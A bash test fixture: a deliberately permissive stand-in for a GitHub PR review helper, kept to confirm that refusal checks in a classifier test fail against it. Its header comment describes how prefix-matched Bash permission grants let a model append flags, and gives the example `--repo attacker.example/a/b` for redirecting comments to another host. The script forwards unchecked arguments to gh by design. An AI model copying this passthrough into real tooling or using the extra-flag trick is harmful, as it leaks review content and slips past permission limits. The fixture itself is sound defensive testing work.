#!/usr/bin/env bash
# NEGATIVE CONTROL for scripts/review-gh.sh. Not used in CI; not run by the
# workflow. Its only job is to make the refusal checks in
# scripts/test-review-classifier.sh falsifiable:
#
#   REVIEW_GH=scripts/fixtures/review-gh/permissive-helper.sh \
#     bash scripts/test-review-classifier.sh
#
# should go RED. If it does not, those checks are decoration.
#
# What it stands for: a sink the model can re-aim. It takes the same subcommands
# as the real helper and then forwards whatever extra arguments it is handed
# straight to `gh` — which is precisely what a prefix-matched `Bash(gh pr
# comment:*)` grant amounted to, because Claude Code's Bash matcher permits extra
# flags on the same invocation. So `summary 'x' --repo attacker.example/a/b`
# reaches another host here, and is refused by the real helper.
#
# It is committed rather than written ad hoc so the failure COUNT is reproducible:
# an uncommitted stand-in makes the number in a PR description unverifiable, and
# two people counting different things was how it first got misreported.

set -uo pipefail

repo=${REVIEW_REPO:-}
pr=${REVIEW_PR:-}

sub=${1:-}
[ "$#" -gt 0 ] && shift

case "$sub" in
  diff)
    exec gh pr diff "$pr" --repo "$repo" "$@"
    ;;
  view)
    fields=${1:-}
    [ "$#" -gt 0 ] && shift
    exec gh pr view "$pr" --repo "$repo" --json "$fields" "$@"
    ;;
  summary)
    body=${1:-}
    [ "$#" -gt 0 ] && shift
    exec gh pr comment "$pr" --repo "$repo" --body "$body" "$@"
    ;;
  inline)
    path=${1:-}
    line=${2:-}
    body=${3:-}
    [ "$#" -ge 3 ] && shift 3
    sha=$(gh pr view "$pr" --repo "$repo" --json headRefOid --jq '.headRefOid')
    exec gh api --method POST "repos/$repo/pulls/$pr/comments" \
      -f "body=$body" \
      -f "commit_id=$sha" \
      -f "path=$path" \
      -F "line=$line" \
      -f side=RIGHT "$@"
    ;;
esac

exit 0
